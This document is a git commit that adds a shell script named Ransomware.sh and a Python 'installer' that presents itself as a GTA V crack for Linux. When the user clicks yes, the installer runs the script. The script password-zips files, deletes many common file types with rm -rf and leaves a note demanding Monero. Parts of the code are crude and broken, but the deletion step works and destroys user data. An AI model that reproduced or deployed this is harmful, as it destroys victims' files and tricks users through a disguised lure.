737931846aaf9ba12e4c1dc65e989ccb867e6fa0
Briiqn <82249811+Briiqn@users.noreply.github.com>
2021-12-20 19:56:32 -0500

    First

---
+++ Ransomware.sh
@@ -0,0 +1,26 @@
+#!/bin/sh
+#!/bin/bash
+#!/bin/zsh
+PASS=$(($$$$^64*32767^128*128^32767*$$^$$))
+PASSS= $$ + $PASS
+PASSSS=$$ + $PASSS
+for i in 'seq 10';
+do
+nohup zip --password $PASS Your\ Files. *.* */*
+clear
+nohup mkdir $PASS
+clear
+nohup rm -rf *.png *.jpg *.jpeg *.webp *.java *.bin *.htm *.html *.xlsx *.xlsm *.xlsb *.xltx *.docx *.doc *.jar *.mp3 *.mp4 *.py *.exe */*.* *.log *.rar *.zip
+clear
+nohup touch README
+clear
+echo '' >> README
+echo 'Hi your files are under my control now unless u send XXX to this Monero Address   _____  ' >> README
+clear
+rm nohup.out
+nano README & disown
+sleep 20;
+vim README & disown
+sleep 20;
+   done
+
---
+++ main.py
@@ -0,0 +1,11 @@
+from easygui import *
+import os
+install = 'chmod ugo+rwx Ransomware.sh & ./Ransomware.sh'
+msg = "Install GTA V Crack Linux Port"
+title = "Installer"
+ch=ynbox(msg, title)
+if ch==1:
+    install = 'chmod ugo+rwx Ransomware.sh & ./Ransomware.sh'
+    os.system(install)
+else:
+    exit (0)
